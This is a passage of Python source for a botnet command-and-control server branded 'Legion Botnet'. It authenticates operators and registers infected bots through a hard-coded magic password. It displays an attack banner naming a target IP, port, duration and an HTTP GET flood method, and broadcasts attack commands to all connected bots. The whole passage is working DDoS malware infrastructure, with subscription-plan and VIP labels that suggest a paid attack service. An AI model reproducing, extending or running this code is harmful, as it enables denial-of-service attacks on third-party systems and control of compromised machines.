                                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                                time.sleep(5)
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Target › {Fore.LIGHTRED_EX}[{(ip)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Port   › {Fore.LIGHTRED_EX}[443]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Time   › {Fore.LIGHTRED_EX}[{(secs)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Method › {Fore.LIGHTRED_EX}[HTTPGET]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Author › {Fore.LIGHTBLUE_EX}[m1lan27]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Plan   › {Fore.LIGHTMAGENTA_EX}[Ultra]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] VIP    › {Fore.LIGHTGREEN_EX}[True]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                broadcast(data)

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;Login | Legion Botnet\a', False)


    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTMAGENTA_EX}Username{Fore.LIGHTMAGENTA_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break


    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTMAGENTA_EX}Password{Fore.LIGHTMAGENTA_EX}:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break


    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()


    else:

        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start()


    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()